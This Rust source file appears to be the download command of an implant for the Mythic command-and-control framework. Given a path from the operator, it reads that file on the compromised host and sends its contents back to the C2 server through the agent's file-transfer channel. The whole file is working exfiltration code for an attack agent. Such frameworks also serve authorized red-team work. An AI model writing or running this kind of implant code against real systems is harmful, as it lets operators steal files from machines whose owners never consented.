use crate::structs::{FileBrowserArguments, SendFileToMythicStruct, Task};
use tokio::sync::mpsc;

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: FileBrowserArguments = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => FileBrowserArguments {
            path: Some(task.data.params.clone()),
            file: None,
            host: None,
            file_browser: None,
            depth: None,
        },
    };

    let file_path = args.path.unwrap_or_else(|| task.data.params.clone());
    let path = std::path::Path::new(&file_path);

    let data = match tokio::fs::read(path).await {
        Ok(d) => d,
        Err(e) => {
            response.set_error(&format!("Failed to read file: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let filename = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| file_path.clone());

    let (finished_tx, mut finished_rx) = mpsc::channel::<i32>(1);

    let send_msg = SendFileToMythicStruct {
        task_id: task.data.task_id.clone(),
        is_screenshot: false,
        file_name: filename.clone(),
        send_user_status_updates: true,
        full_path: file_path.clone(),
        data: Some(data),
        finished_transfer: finished_tx,
        tracking_uuid: String::new(),
        send_responses: task.job.send_responses.clone(),
        file_transfers: task.job.file_transfers.clone(),
    };

    if task.job.send_file_to_mythic.send(send_msg).await.is_err() {
        response.set_error("Failed to initiate file transfer");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    // Wait for transfer to complete
    let _ = finished_rx.recv().await;

    response.user_output = format!("Downloaded: {}", file_path);
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
